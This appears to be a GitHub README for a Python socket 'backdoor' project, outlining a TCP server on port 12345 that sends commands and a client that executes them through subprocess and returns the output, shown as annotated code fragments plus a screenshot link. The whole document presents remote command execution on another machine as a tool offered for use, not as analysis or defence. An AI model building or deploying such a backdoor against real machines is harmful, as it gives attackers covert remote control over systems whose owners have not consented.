# Backdoor-Client-Server-Socket-Python
Simple backdoor using lib python's socket

# lib
- `from socket import *` # for connection
- `import subprocess` # for cmd command

# Server
- `sock = socket(AF_INET, SOCK_STREAM)` # set TCP socket
- `port = 12345` # port of server
- `sock.bind(('', port)) && sock.listen(1)` # set server
- `conn, addr = sock.accept()` # conn = connection && addr = (client)address
- `conn.send(command.encode())` # send in array bytes
- `conn.recv(1024).decode("utf-8")` #receive and convert in string

# Client
- `CMD = subprocess.Popen(command, ...)` # set subprocess for send CMD command

![Image](https://github.com/NoNameoN-A/Backdoor-Client-Server-Socket-Python/blob/main/Else/screenshot.png)
